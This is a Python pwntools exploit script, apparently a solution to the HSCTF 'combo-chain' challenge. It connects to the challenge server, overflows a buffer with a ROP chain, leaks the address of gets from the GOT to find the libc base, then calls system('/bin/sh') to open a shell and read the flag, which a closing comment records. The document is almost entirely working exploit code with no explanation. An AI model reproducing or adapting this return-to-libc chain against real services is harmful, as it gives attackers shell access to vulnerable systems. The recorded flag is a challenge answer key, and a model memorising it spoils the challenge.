from pwn import *

prog = ELF('combo-chain')
local = False
host = 'localhost' if local else 'pwn.hsctf.com'
port = 1337 if local else 2345
libc = prog.libc if local else ELF('libc.so')

if __name__ == '__main__':
    ret =0x00000000004011a3
    gets_off = libc.symbols[b'gets']
    system_off = libc.symbols[b'system']
    printf_prog = 0x40118b
    rop = ROP(prog)
    popedi = 0x0000000000401263
    pop2esi = 0x0000000000401261
    binsh = next(prog.search('/bin/sh'))
    bss = 0x404660
    sys = 0x7f1751ee0390 
    gotprintf = prog.got[b'printf']
    gotgets = prog.got[b'gets']

    system_off = libc.symbols[b'system']
    
    s= remote(host, port)
    print(s.recvuntil(': ').decode())
    exp = p64(bss)*2+p64(popedi)+p64(bss)+p64(prog.plt[b'gets'])+p64(pop2esi)+p64(bss)*2+p64(popedi)+p64(prog.got[b'gets'])+p64(printf_prog)+p64(prog.symbols[b'vuln'])+b'\n'
    exp1=b'%s'+b'\n'
    exp2=p64(prog.symbols[b'_start'])*4+b'\n'
    exp+=exp1
    s.send(exp)
    print(exp)
    leak_got_gets=u64(s.recv(8)+b'\x00'*2)
    print('out = {}'.format(hex(leak_got_gets)))
    base = leak_got_gets-gets_off
    system = system_off + base

    exp2 = p64(popedi)*3+p64(binsh)+p64(system)+b'\n'

    s.send(exp2)
    s.sendline('cat flag')
    print('Flag = {}'.format(s.recvline().decode()))
    s.close()

    #Flag = hsctf{i_thought_konami_code_would_work_here}

